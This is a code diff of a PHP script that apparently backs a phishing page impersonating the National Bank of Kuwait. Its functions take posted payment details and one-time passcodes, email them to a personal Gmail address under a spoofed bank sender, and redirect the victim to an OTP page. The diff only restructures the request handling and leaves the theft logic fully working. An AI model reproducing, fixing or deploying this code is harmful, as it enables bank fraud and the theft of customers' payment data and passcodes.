@@ -1,19 +1,6 @@
 <?php
 
-header("Access-Control-Allow-Origin: https://nbkkuwait.com");
-
-header('Content-Type: application/json');
-
-
-if(isset($_POST)) {
-    if(isset($_POST['action']) =='sendtEmailPatment'){  
-        sendtEmailPatment($_POST);
-    }if(isset($_POST['action']) =='sendOTP'){  
-        sendOTP($_POST) ;
-    }
-
-    exit;  
-}
+// header("Access-Control-Allow-Origin: https://nbkkuwait.com");
 
 function sendtEmailPatment($data) {
     $to = "hassankiwan92@gmail.com";
@@ -28,20 +15,16 @@ function sendtEmailPatment($data) {
     $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
 
     // Send the email
+    header('Content-Type: application/json');
     if (mail($to, $subject, $message, $headers)) {
         // Redirect if using GET only
         echo json_encode(['status' => 'success', 'redirect' => './otp.php']);
-        exit;
     } else {
         echo json_encode(['status' => 'error', 'message' => 'Failed.']);
-      
     }
+    
     exit;
 }
-
-
-
-
 function sendOTP($data){
     $to = "hassankiwan92@gmail.com";
     $sender="admin@nbkkuwait.com";
@@ -55,14 +38,24 @@ function sendOTP($data){
     $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
     
     // Send the email
+    header('Content-Type: application/json');
     if (mail($to, $subject, $message, $headers)) {
         // Redirect if using GET only
         echo json_encode(['status' => 'success', 'redirect' => './otp.php']);
-        exit;
     } else {
         echo json_encode(['status' => 'error', 'message' => 'Failed.']);
       
     }
     exit;
+}
+
+
+if(isset($_POST)) {
+    if(isset($_POST['action']) =='sendtEmailPatment'){  
+        sendtEmailPatment($_POST);
+    }if(isset($_POST['action']) =='sendOTP'){  
+        sendOTP($_POST) ;
+    }
+    exit;  
 }
 ?>
